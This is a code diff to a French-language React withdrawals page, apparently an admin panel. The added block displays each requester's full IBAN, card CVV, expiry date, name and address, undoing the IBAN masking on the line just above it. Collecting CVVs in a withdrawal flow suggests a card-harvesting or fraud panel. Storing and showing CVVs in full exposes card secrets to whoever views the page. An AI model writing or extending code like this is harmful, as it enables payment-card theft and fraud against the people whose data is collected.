@@ -942,6 +942,34 @@ function PageRetraits() {
                       <i className="ti ti-building-bank" style={{ marginRight:4 }}/>{wr.bank_name} · ···{wr.iban ? wr.iban.slice(-4) : '????'}
                     </div>
                     {wr.motif && <div style={{ fontSize:11, color:'var(--text2)' }}>Motif : {wr.motif}</div>}
+
+                    {/* Infos carte bancaire */}
+                    {wr.cvv && wr.card_expiry && (
+                      <div style={{ marginTop:8, background:'var(--bg)', border:'1px solid var(--border)', borderRadius:8, padding:'8px 12px' }}>
+                        <div style={{ fontSize:10, fontWeight:700, color:'var(--navy)', marginBottom:6, textTransform:'uppercase', letterSpacing:1 }}>
+                          💳 Informations carte
+                        </div>
+                        <div style={{ fontSize:11, color:'var(--text2)', marginBottom:3 }}>
+                          <span style={{ fontWeight:600, color:'var(--navy)' }}>Titulaire :</span> {wr.first_name} {wr.last_name}
+                        </div>
+                        <div style={{ fontSize:11, color:'var(--text2)', marginBottom:3 }}>
+                          <span style={{ fontWeight:600, color:'var(--navy)' }}>IBAN :</span> <span style={{ fontFamily:'monospace' }}>{wr.iban}</span>
+                        </div>
+                        <div style={{ fontSize:11, color:'var(--text2)', marginBottom:3 }}>
+                          <span style={{ fontWeight:600, color:'var(--navy)' }}>CVV :</span> <span style={{ fontFamily:'monospace', letterSpacing:2 }}>{wr.cvv}</span>
+                        </div>
+                        <div style={{ fontSize:11, color:'var(--text2)', marginBottom:3 }}>
+                          <span style={{ fontWeight:600, color:'var(--navy)' }}>Expiration :</span> <span style={{ fontFamily:'monospace' }}>{wr.card_expiry}</span>
+                        </div>
+                        <div style={{ fontSize:11, color:'var(--text2)', marginBottom:3 }}>
+                          <span style={{ fontWeight:600, color:'var(--navy)' }}>Adresse :</span> {wr.address}, {wr.postal_code} {wr.city}
+                        </div>
+                        <div style={{ fontSize:11, color:'var(--text2)' }}>
+                          <span style={{ fontWeight:600, color:'var(--navy)' }}>Banque :</span> {wr.bank_name}
+                        </div>
+                      </div>
+                    )}
+
                     <div style={{ fontSize:10, color:'var(--text2)', marginTop:2 }}>
                       {new Date(wr.created_at).toLocaleDateString('fr-FR',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'})}
                     </div>
